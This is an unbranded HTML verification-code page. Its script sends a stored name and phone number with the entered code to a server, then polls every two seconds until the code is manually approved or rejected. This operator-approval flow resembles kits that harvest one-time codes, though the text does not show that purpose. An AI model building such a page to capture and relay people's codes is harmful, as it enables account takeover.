<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Enter Code</title>
<style>
    body {
        font-family: Arial, sans-serif;
        background: #f6f7fb;
        display: flex;
        justify-content: center;
        align-items: center;
        height: 100vh;
        margin: 0;
    }

    .code-container {
        background: #fff;
        padding: 30px;
        border-radius: 12px;
        width: 100%;
        max-width: 350px;
        box-shadow: 0 5px 15px rgba(0,0,0,0.1);
        text-align: center;
    }

    h2 { margin-bottom: 8px; }
    p { color: #666; font-size: 14px; }

    input {
        width: 100%;
        padding: 12px;
        font-size: 18px;
        border: 2px solid #ccc;
        border-radius: 8px;
        outline: none;
        margin: 15px 0;
    }

    input:focus {
        border-color: red;
        box-shadow: 0 0 5px rgba(255,0,0,0.3);
    }

    button {
        width: 100%;
        padding: 12px;
        background: red;
        color: white;
        border: none;
        border-radius: 6px;
        font-size: 16px;
        cursor: pointer;
        position: relative;
    }

    button:disabled {
        background: #ccc;
        cursor: not-allowed;
    }

    .spinner {
        display: none;
        width: 20px;
        height: 20px;
        border: 3px solid #fff;
        border-top: 3px solid rgba(255,255,255,0.3);
        border-radius: 50%;
        animation: spin 1s linear infinite;
        position: absolute;
        right: 15px;
        top: 50%;
        transform: translateY(-50%);
    }

    @keyframes spin {
        0% { transform: translateY(-50%) rotate(0deg); }
        100% { transform: translateY(-50%) rotate(360deg); }
    }

    .status {
        margin-top: 15px;
        font-size: 14px;
        color: #555;
    }

    .error {
        color: red;
    }
</style>
</head>

<body>
<div class="code-container">
    <h2>Enter Your Code</h2>
    <p>Please enter your verification code</p>

    <form id="codeForm">
        <input type="text" id="codeInput" placeholder="Enter code" maxlength="10" required>
        <button id="submitBtn" disabled>
            Submit Code
            <div class="spinner" id="spinner"></div>
        </button>
    </form>

    <div class="status" id="status"></div>
</div>

<script>
const input = document.getElementById('codeInput');
const button = document.getElementById('submitBtn');
const statusText = document.getElementById('status');
const spinner = document.getElementById('spinner');
const form = document.getElementById('codeForm');

input.addEventListener('input', () => {
    button.disabled = !input.value.trim();
});

form.addEventListener('submit', async (e) => {
    e.preventDefault();
    const code = input.value.trim();
    const name = localStorage.getItem('name');   // ✅ get name
    const phone = localStorage.getItem('phone'); // ✅ get phone

    button.disabled = true;
    button.innerText = 'Verifying...';
    spinner.style.display = 'inline-block';
    statusText.innerText = 'Please wait while we verify your code...';

    await fetch('/submit-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ name, phone, code }) // ✅ send name + phone + code
    });

    pollCodeApproval(code);
});

async function pollCodeApproval(code) {
    const interval = setInterval(async () => {
        const res = await fetch(`/check-code/${code}`);
        const data = await res.json();

        if (data.approved === true) {
            clearInterval(interval);
            window.location.href = 'success.html';
        }

        if (data.approved === false) {
            clearInterval(interval);
            statusText.innerHTML = '<span class="error">Incorrect code. Please try again.</span>';
            button.innerText = 'Submit Code';
            spinner.style.display = 'none';
            input.value = '';
            button.disabled = true;
            input.focus();
        }
    }, 2000);
}
</script>
</body>
</html>
